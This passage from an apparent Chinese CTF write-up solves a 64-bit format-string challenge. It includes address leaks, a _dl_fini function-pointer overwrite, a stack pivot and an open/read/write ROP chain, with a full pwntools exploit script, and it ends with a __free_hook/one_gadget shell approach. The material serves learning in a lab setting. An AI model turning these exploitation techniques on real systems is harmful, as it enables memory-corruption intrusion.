<p>而且<code>printf</code>之后没有<code>ret</code>，直接就<code>exit(0)</code>了…所以改写返回地址也没用…</p>
<p>开启了<code>PIE</code>倒是没什么，反正也能通过格式化字符串漏洞各种泄漏，程序代码如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">sub_9AF</span><span class="params">(FILE *a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;format, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;format, <span class="number">0x100</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(a1, &amp;format);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sleep()</code>中并没有什么能利用的，那就只有<code>exit()</code>了…</p>
<p>于是<code>gdb</code>跟进<code>exit()</code>，发现<code>ld-2.23.so</code>中有一处函数指针可改写：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x7effca8f7b3e &lt;_dl_fini+126&gt;    call   qword ptr [rip + 0x216404] &lt;0x7effca8e7c90&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/4xg <span class="variable">$rip</span> + 0x216404+6</span></span><br><span class="line">0x7effcab0df48 &lt;_rtld_global+3848&gt;:	0x00007effca8e7c90	0x00007effca8e7ca0</span><br><span class="line">0x7effcab0df58 &lt;_rtld_global+3864&gt;:	0x00007effca8fb0b0	0x0000000000000006</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">...</span><br><span class="line">0x7effcab0c000 0x7effcab0d000 r--p 1000  25000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x7effcab0d000 0x7effcab0e000 rw-p 1000  26000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x7effcab0e000 0x7effcab0f000 rw-p 1000  0  </span><br><span class="line">0x7ffe20323000 0x7ffe20344000 rw-p 21000 0     [stack]</span><br></pre></td></tr></table></figure></div>

<p>虽然开了随机化，但是试了几次，这个函数指针和<code>libc</code>之间的偏移量是不变的，因此可以利用（感觉这个<code>_dl_fini</code>里的函数指针和<code>__libc_csu_fini</code>里面的指针差不多……）</p>
<p>本来想着用<code>one_gadget</code>一波带走这题，但想要执行<code>exit(0)</code>必须先退出<code>while(read(0, &amp;format, 0x100uLL))</code>这个循环，有两种方法可以退出循环：</p>
<ul>
<li>关闭<code>stdin</code>：<code>p.stdin.close()</code>（适用于本地调试，打远程不行）</li>
<li>中断输入：<code>p.shutdown(&#39;send&#39;)</code> <a href="https://blog.csdn.net/Breeze_CAT/article/details/100087036" target="_blank" rel="noopener">ref</a></li>
</ul>
<p>不管用哪种方法，都没法继续向程序发送数据了，因此即使拿到<code>shell</code>也没用</p>
<p>于是，考虑构造<code>ROP</code>链，先<code>open /flag</code>再<code>read</code>+<code>write</code>把flag打印出来</p>
<p>跟进<code>_dl_fini</code>里面调用的那个函数，看下栈分布情况：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp  0x7ffe203411b8 —▸ 0x7effca8f7b44 (_dl_fini+132) </span><br><span class="line">01:0008│      0x7ffe203411c0 —▸ 0x7ffe203413d0 </span><br><span class="line">02:0010│      0x7ffe203411c8 ◂— 0x3000000010</span><br><span class="line">03:0018│      0x7ffe203411d0 —▸ 0x7ffe203412a0 ◂— 0x0</span><br><span class="line">04:0020│      0x7ffe203411d8 —▸ 0x7ffe203411e0 ◂— 0x26 /* '&amp;' */</span><br><span class="line">05:0028│      0x7ffe203411e0 ◂— 0x26 /* '&amp;' */</span><br><span class="line">06:0030│      0x7ffe203411e8 —▸ 0x7ffe20341310 ◂— 0x0</span><br><span class="line">07:0038│      0x7ffe203411f0 —▸ 0x7ffe203412b0 ◂— 'hhhhhhhh'</span><br></pre></td></tr></table></figure></div>

<p>发现通过<code>read()</code>读的数据，与当前<code>rsp</code>离得并不远，于是可以把栈迁移到可控的区域：</p>
<p>需要用到两个<code>gadget</code>：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p6r   &#x3D; 0x0013cc0f + libc_base</span><br><span class="line">prsp  &#x3D; 0x0000000000003838 + libc_base # pop rsp ; ret</span><br></pre></td></tr></table></figure></div>

<p>第一个<code>gadget</code>把多余的6个参数<code>pop</code>掉，然后第二个<code>gadget</code>直接<code>pop rsp</code>把栈迁移到<code>read</code>读的<code>buf</code></p>
<blockquote>
<p>P.s. libc中真是什么gadget都有鸭~太方便了！</p>
</blockquote>
<p>这两个<code>libc</code>中的<code>gadget</code>需要通过格式字符串漏洞写到栈中（栈中位置也是相对固定的）</p>
<p>此前，还需要用格式化字符串漏洞泄漏下libc和栈地址：</p>
<ul>
<li><code>libc</code>直接泄漏<code>libc_start_main_ret</code></li>
<li>栈的话随便找一个就行…</li>
</ul>
<p>完成栈迁移的<code>gadget</code>链如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7efe86626c0f &lt;__nscd_getpwnam_r+63&gt;    pop    rcx &lt;0x7efe86ada040&gt;</span><br><span class="line">0x7efe86626c10 &lt;__nscd_getpwnam_r+64&gt;    pop    rbx</span><br><span class="line">0x7efe86626c11 &lt;__nscd_getpwnam_r+65&gt;    pop    rbp</span><br><span class="line">0x7efe86626c12 &lt;__nscd_getpwnam_r+66&gt;    pop    r12</span><br><span class="line">0x7efe86626c14 &lt;__nscd_getpwnam_r+68&gt;    pop    r13</span><br><span class="line">0x7efe86626c16 &lt;__nscd_getpwnam_r+70&gt;    pop    r14</span><br><span class="line">0x7efe86626c18 &lt;__nscd_getpwnam_r+72&gt;    ret    </span><br><span class="line"> ↓</span><br><span class="line">0x7efe864ed838                           pop    rsp</span><br><span class="line">0x7efe864ed839                           ret    </span><br><span class="line"> ↓</span><br><span class="line">0x7efe8651d544 &lt;__gettextparse+1140&gt;     pop    rax ; read buf data</span><br><span class="line">0x7efe8651d545 &lt;__gettextparse+1141&gt;     ret</span><br></pre></td></tr></table></figure></div>

<p>读<code>flag</code>的<code>ROP</code>链如下：</p>
<p>open</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  0x7fd8c2bf2102 &lt;iconv+194&gt;            pop    rdi</span><br><span class="line">  0x7fd8c2bf2103 &lt;iconv+195&gt;            ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bf12e8 &lt;init_cacheinfo+40&gt;    pop    rsi</span><br><span class="line">  0x7fd8c2bf12e9 &lt;init_cacheinfo+41&gt;    ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bd2b92                        pop    rdx</span><br><span class="line">► 0x7fd8c2bd2b93                        ret             </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2cc8030 &lt;open64&gt;               cmp    dword ptr [rip + 0x2d2709], 0 &lt;0x7fd8c2f9a740&gt;</span><br><span class="line">  0x7fd8c2cc8037 &lt;open64+7&gt;             jne    open64+25 &lt;0x7fd8c2cc8049&gt;</span><br><span class="line">  0x7fd8c2cc8039 &lt;__open_nocancel&gt;      mov    eax, 2</span><br><span class="line">  0x7fd8c2cc803e &lt;__open_nocancel+5&gt;    syscall </span><br><span class="line">  0x7fd8c2cc8040 &lt;__open_nocancel+7&gt;    cmp    rax, -0xfff</span><br></pre></td></tr></table></figure></div>

<p>read</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  0x7fd8c2bf2102 &lt;iconv+194&gt;            pop    rdi</span><br><span class="line">  0x7fd8c2bf2103 &lt;iconv+195&gt;            ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bf12e8 &lt;init_cacheinfo+40&gt;    pop    rsi</span><br><span class="line">  0x7fd8c2bf12e9 &lt;init_cacheinfo+41&gt;    ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bd2b92                        pop    rdx</span><br><span class="line">► 0x7fd8c2bd2b93                        ret             </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2cc8250 &lt;read&gt;                 cmp    dword ptr [rip + 0x2d24e9], 0 &lt;0x7fd8c2f9a740&gt;</span><br><span class="line">  0x7fd8c2cc8257 &lt;read+7&gt;               jne    read+25 &lt;0x7fd8c2cc8269&gt;</span><br><span class="line"></span><br><span class="line">  0x7fd8c2cc8259 &lt;__read_nocancel&gt;      mov    eax, 0</span><br><span class="line">  0x7fd8c2cc825e &lt;__read_nocancel+5&gt;    syscall</span><br></pre></td></tr></table></figure></div>

<p>write</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  0x7fd8c2bf2102 &lt;iconv+194&gt;             pop    rdi</span><br><span class="line">  0x7fd8c2bf2103 &lt;iconv+195&gt;             ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bf12e8 &lt;init_cacheinfo+40&gt;     pop    rsi</span><br><span class="line">  0x7fd8c2bf12e9 &lt;init_cacheinfo+41&gt;     ret    </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2bd2b92                         pop    rdx</span><br><span class="line">► 0x7fd8c2bd2b93                         ret            </span><br><span class="line">   ↓</span><br><span class="line">  0x7fd8c2cc82b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2489], 0 &lt;0x7fd8c2f9a740&gt;</span><br><span class="line">  0x7fd8c2cc82b7 &lt;write+7&gt;               jne    write+25 &lt;0x7fd8c2cc82c9&gt;</span><br><span class="line"></span><br><span class="line">  0x7fd8c2cc82b9 &lt;__write_nocancel&gt;      mov    eax, 1</span><br><span class="line">  0x7fd8c2cc82be &lt;__write_nocancel+5&gt;    syscall</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>libc gadget真好用:D</p>
</blockquote>
<p>exp:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./fmt64'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc-2.23.so'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span><span class="params">(pos)</span>:</span></span><br><span class="line">    sl(<span class="string">'LLLLLLLL%%%d$p'</span>%(pos))</span><br><span class="line">    <span class="keyword">return</span> rc()[<span class="number">8</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">"%10$s"</span>.ljust(<span class="number">24</span>,<span class="string">'S'</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">return</span> rc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_byte</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> data==<span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">"%10$hhn"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"%%%dc%%10$hhn"</span>%(data)</span><br><span class="line">    payload = payload.ljust(<span class="number">24</span>,<span class="string">'T'</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">return</span> rc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_dw</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    alter_byte(addr,data&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">1</span>,(data&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">2</span>,(data&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">3</span>,(data&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_qw</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    alter_dw(addr,data)</span><br><span class="line">    alter_dw(addr+<span class="number">4</span>,data&gt;&gt;<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flush</span><span class="params">(c=<span class="string">'F'</span>)</span>:</span></span><br><span class="line">    sl(c*<span class="number">8</span>+<span class="string">'\0'</span>*<span class="number">0x80</span>)</span><br><span class="line">    rc()</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">ru(<span class="string">'This\'s my mind!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">offset___libc_start_main_ret = <span class="number">0x20830</span></span><br><span class="line">libc_base = int(leak_addr(<span class="number">46</span>),<span class="number">16</span>)-offset___libc_start_main_ret</span><br><span class="line">info_addr(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ld-2.23 dl_fini (function array)</span></span><br><span class="line">ld_ptr = libc_base + <span class="number">0x5f0f48</span>  <span class="comment">#_dl_fini</span></span><br><span class="line">info_addr(<span class="string">'ld_ptr'</span>,ld_ptr)</span><br><span class="line"><span class="comment"># option</span></span><br><span class="line">info_addr(<span class="string">'raw func in ptr'</span>,u64(show(ld_ptr)[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">p6r   = <span class="number">0x0013cc0f</span> + libc_base</span><br><span class="line">prsp  = <span class="number">0x0000000000003838</span> + libc_base <span class="comment"># pop rsp ; ret</span></span><br><span class="line">prdi  = <span class="number">0x0000000000021102</span> + libc_base <span class="comment"># pop rdi ; ret</span></span><br><span class="line">prsi  = <span class="number">0x00000000000202e8</span> + libc_base <span class="comment"># pop rsi ; ret</span></span><br><span class="line">prdx  = <span class="number">0x0000000000001b92</span> + libc_base <span class="comment"># pop rdx ; ret</span></span><br><span class="line">libc_open  = libc.symbols[<span class="string">'open'</span>] + libc_base</span><br><span class="line">libc_read  = libc.symbols[<span class="string">'read'</span>] + libc_base</span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>] + libc_base</span><br><span class="line"></span><br><span class="line">flush()</span><br><span class="line"><span class="comment"># leak stack </span></span><br><span class="line">stack_base = int(leak_addr(<span class="number">41</span>),<span class="number">16</span>)</span><br><span class="line">info_addr(<span class="string">'stack_base'</span>,stack_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calc pivot stack </span></span><br><span class="line"><span class="comment">#pwndbg&gt; p 0x7ffc3c28fc58-0x7ffc3c28fe40</span></span><br><span class="line"><span class="comment">#$1 = -488</span></span><br><span class="line">prsp_addr  = stack_base - <span class="number">488</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare to stack pivot</span></span><br><span class="line"><span class="comment"># g1</span></span><br><span class="line">log.success(<span class="string">"write p6r:"</span>+hex(p6r)+<span class="string">" to "</span>+hex(ld_ptr));</span><br><span class="line">alter_dw(ld_ptr, p6r)</span><br><span class="line"><span class="comment"># g2</span></span><br><span class="line">log.success(<span class="string">"write prsp:"</span>+hex(prsp)+ <span class="string">" to "</span>+hex(prsp_addr));</span><br><span class="line">alter_qw(prsp_addr, prsp)</span><br><span class="line"><span class="comment"># stack pivot to read buf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start rop</span></span><br><span class="line">ropchain = [</span><br><span class="line">            <span class="comment"># open('/flag',0,0x100)</span></span><br><span class="line">            p64(prdi), p64(stack_base<span class="number">-112</span>),<span class="comment"># -&gt; /flag</span></span><br><span class="line">            p64(prsi), p64(<span class="number">0</span>),</span><br><span class="line">            p64(prdx), p64(<span class="number">0x100</span>),</span><br><span class="line">            p64(libc_open),</span><br><span class="line">            <span class="comment"># read(0,buf,0x100)</span></span><br><span class="line">            p64(prdi), p64(<span class="number">3</span>),</span><br><span class="line">            p64(prsi), p64(stack_base),</span><br><span class="line">            p64(prdx), p64(<span class="number">0x100</span>),</span><br><span class="line">            p64(libc_read),</span><br><span class="line">            <span class="comment"># write(1,buf,0x100)</span></span><br><span class="line">            p64(prdi), p64(<span class="number">1</span>),</span><br><span class="line">            p64(prsi), p64(stack_base),</span><br><span class="line">            p64(prdx), p64(<span class="number">0x100</span>),</span><br><span class="line">            p64(libc_write),</span><br><span class="line">            p64(<span class="number">0xdeadbeef</span>),</span><br><span class="line">            <span class="string">'/flag\0\0\0'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug('b *'+hex(p6r))</span></span><br><span class="line"></span><br><span class="line">flush(<span class="string">'\x90'</span>)</span><br><span class="line">sl(<span class="string">''</span>.join(ropchain))</span><br><span class="line"></span><br><span class="line"><span class="comment"># close stdin to break loop (so one_gadget does not work)</span></span><br><span class="line"><span class="comment"># p.stdin.close()</span></span><br><span class="line"><span class="comment"># shutdown sent also work</span></span><br><span class="line">p.shutdown(<span class="string">"send"</span>) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>p.s.做<code>simple_rop</code>的时候还说没必要专门搞个<code>Ubuntu16</code>的环境，结果做这题时就装个虚拟机….真香</p>
</blockquote>
<hr>
<blockquote>
<p> pp.s.以上是我的菜鸡解法……</p>
</blockquote>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>后来看到了<a href="https://poning.me/2017/03/23/EasiestPrintf/" target="_blank" rel="noopener">0CTF 2017 Quals: EasiestPrintf</a> 原来<code>scanf</code>和<code>printf</code>都有可能触发<code>malloc</code>和<code>free</code></p>
<blockquote>
<p> <code>printf(&quot;%100000c&quot;);</code>的时候就会触发<code>malloc</code>申请字符缓冲区，用完后会<code>free</code>掉缓冲区</p>
</blockquote>
<p>因此…直接改<code>__free_hook</code>为<code>one_gadget</code>，然后输入<code>&quot;%100000c&quot;</code>触发<code>free</code>就拿到shell了……</p>
